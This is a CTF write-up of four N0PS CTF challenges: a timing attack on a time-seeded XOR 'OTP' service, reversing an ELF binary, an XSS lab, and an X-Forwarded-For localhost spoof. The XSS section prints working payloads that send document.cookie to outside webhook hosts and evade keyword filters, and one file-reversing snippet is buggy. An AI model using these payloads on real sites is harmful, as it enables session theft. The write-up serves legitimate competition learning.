## 1. Broken OTP
#Crypto 
#### Description
i heard OTP it the most secure encryption algorithm ever
#### Given code
```
import random
secret = 'XXXXXXXXXXXXXXXXXXXX'
PINK = 118
RED = 101
YELLOW = 97
GREEN = 108
BLACK = __builtins__
PURPLE = dir
e = getattr(BLACK, bytes([RED, PINK, YELLOW, GREEN]).decode())
g = e(''.__dir__()[4].strip('_')[:7])
b = g(BLACK, PURPLE(BLACK)[92])
i = g(BLACK, PURPLE(BLACK)[120])
t = ['74696d65', '72616e646f6d', '5f5f696d706f72745f5f', '726f756e64', '73656564']
d = lambda x: b.fromhex(x).decode()
fb = g(i, PURPLE(i)[-6])
_i = lambda x: e(d(t[2]))(x)
s = lambda: g(BLACK,d(t[3]))(g(_i(d(t[0])), d(t[0]))()) + fb(secret.encode())
r = g(_i(d(t[1])), d(t[4]))

def kg(l):
    return bytes([random.randint(0,255) for i in range(l)])
    
def c(p):
    k = kg(len(p))
    return bytes([k[i] ^ p[i] for i in range(len(p))]).hex()

if __name__ == '__main__':
    r(s())
    print("Welcome to our encryption service.")
    choice = input("Choose between:\n1. Encrypt your message.\n2. Get the encrypted secret.\nEnter your choice: ")
    match choice:
        case "1":
            message = input("Please enter the message you wish to encrypt: ")
            print(f"Your encrypted message is: {c(message.encode())}")
        case "2":
            print(f"The secret is: {c(secret.encode())}")
        case _:
            print("Invalid option!")
```

First I de-obfuscated the code with the help of ChatGPT
```
import random
import time

# Placeholder for the actual secret
secret = "SuperSecret"

# Generate a seed value based on the current time and the secret
def generate_seed():
    return round(time.time()) + sum(secret.encode())

# Key generation function
def generate_key(length):
    return bytes([random.randint(0, 255) for _ in range(length)])

# Encryption function using XOR
def xor_encrypt(message):
    key = generate_key(len(message))
    return bytes([key[i] ^ message[i] for i in range(len(message))]).hex()

if __name__ == '__main__':
    # Set the random seed using the computed value
    random.seed(generate_seed())
    
    print("Welcome to our encryption service.")
    choice = input("Choose between:\n1. Encrypt your message.\n2. Get the encrypted secret.\nEnter your choice: ")
    
    if choice == "1":
        message = input("Please enter the message you wish to encrypt: ")
        print(f"Your encrypted message is: {xor_encrypt(message.encode())}")
    elif choice == "2":
        print(f"The secret is: {xor_encrypt(secret.encode())}")
    else:
        print("Invalid option!")
```

As we can see this is an XOR encryption service.
Now I implemented a timing attack. The seed changes every second. So I created two instances of the challenge, at the same time. So both the instances will have the same seed and hence will generate the same key say 'k'. In one instance I will use option 1 to encrypt a custom message say 'm' to get a ciphertext 'c'. In the second instance I will use option 2 to encrypt the secret 's' to get encrypted secret say 'cs'. Now the attack is described below.
```
Unknowns : k,s
Knowns : m,c,cs

c = k ^ m So we find k as k = m ^ c
s ^ k = cs So we find s as s = cs ^ k
```
I used below python script to initiate the timing attack and provide the ciphertexts in both option 1 and 2
```
import pwn
import threading

def connect_one():
    hostAddress = 'nopsctf-broken-otp.chals.io'
    conn = pwn.connect(hostAddress, 443, ssl=True, sni=hostAddress)
    conn.recvuntil(b':')
    conn.recvuntil(b':')
    conn.sendline('1'.encode())
    conn.recvuntil(b':')
    conn.sendline(('a'*20).encode())
    print(conn.recvline())

def connect_two():
    hostAddress = 'nopsctf-broken-otp.chals.io'
    conn = pwn.connect(hostAddress, 443, ssl=True, sni=hostAddress)
    conn.recvuntil(b':')
    conn.recvuntil(b':')
    conn.sendline('2'.encode())
    print(conn.recvline())

thread1 = threading.Thread(target=connect_one)
thread2 = threading.Thread(target=connect_two)

thread1.start()
thread2.start()

thread1.join()
thread2.join()

print("Both connections handled successfully.")
```
Then I used the method described above to derive the flag 's'.
**Flag : 2. N0PS{0tP_k3Y_r3u53}**
## 2. Reverse Me
#Rev 
#### Description
Don't complain if you can't see me, because I have to be reversed to make me run 🙃
#### Solution
The Description says : I have to be reversed to make me run. Opening the file in a hex editor, there was no file signature. Since description says about reversing, I scrolled down to the bottom. There I found that the last 3 letters were "FLE". Reverse it : "ELF" -> "ELF Executable"! When reversed, ELF would form the file signature. I used the below script to reverse the hex values in the file.
```
file = open(<filename>,"r")
content = file.read()
content = content.split()
file.close()
content = content.reverse()
file = open("out.jpg","w")
file.write(content)
```
Now I used DogBolt to decompile the executable. The executable took 4 parameters and checked if 4 conditions match. After a bit of math, the 4 conditions were
```
1) (arg1 * -10) + (arg2 * 4) + arg3 + (arg4 * 3) = 28 
2) (arg1 * (-8)) + (arg2 * 9) + (arg3 * 6) + (arg4 * -2) = 72 
3) (arg1 * -2) + (arg2 * -3) + (arg3 * -8) + arg4 = 29 
4) (arg1 * 5) + (arg2 * 7) + arg3 + (arg4 * -6) = 88 (edited)
```
Solving these 4 equations, we get the numbers -3, 8, -7, -9
./reversemeout -3 8 -7 -9

**Flag : N0PS{r1CKUNr0111N6}**
## 3. XSS Lab
#Web
#### Level 1
No Filters

Cookie 1 : bf2a73106a3aa48bab9b8b47e4bd350e
Level 1 : `<script>document.write('<img src="https://webhook.site/ba0e4f1a-6369-4cfd-93e2-ab13573aed13?c='+document.cookie+'" />');</script>`
#### Level 2
Filter:
```
def filter_2(payload):
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```

Cookie 2 :3e79c8a64bd10f5fa897b7832384f043
Level 2 : `<scscriptript>document.write('<imimgg src="https://webhook.site/ba0e4f1a-6369-4cfd-93e2-ab13573aed13?c='+document.cookie+'" />');</scrscriptipt>`
#### Level 3
Filter:
```
def filter_3(payload):
    if "://" in payload.lower():
return "Nope"
    if "document" in payload.lower():
return "Nope"
    if "cookie" in payload.lower():
return "Nope"
    return payload.lower().replace("script", "").replace("img", "").replace("svg", "")
```

Cookie 3 : f40e749b80cff27f8e726b2a95740dd6
Level 3 : `<scscriptript>docuscriptment.write('<imimgg src="https:/script/webhook.site/ba0e4f1a-6369-4cfd-93e2-ab13573aed13?c='+docuscriptment.cooscriptkie+'" />');</scrscriptipt>`
#### Level 4
Filter:
```
def filter_4(payload):
    if any(c in payload for c in '+"/'):
return "Nope"
    if "://" in payload.lower():
return "Nope"
    if "document" in payload.lower():
return "Nope"
    if "cookie" in payload.lower():
return "Nope"
    return payload.replace("script", "").replace("img", "").replace("svg", "")

```

Cookie 4 : N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}
Level 4 : `<imimgg src=x onerror=this.src=atob('aHR0cHM6Ly9lbnNzNzltbHBscXdzLngucGlwZWRyZWFtLm5ldD9jPQ==').concat(docuscriptment.cooscriptkie)>`

## 4. Outsiders
#Web 
#### Description
_Wish you were here.._
#### Solution
Wish you were home.
Add a request header : `X-Forwarded-For : 127.0.0.1`
We get the flag.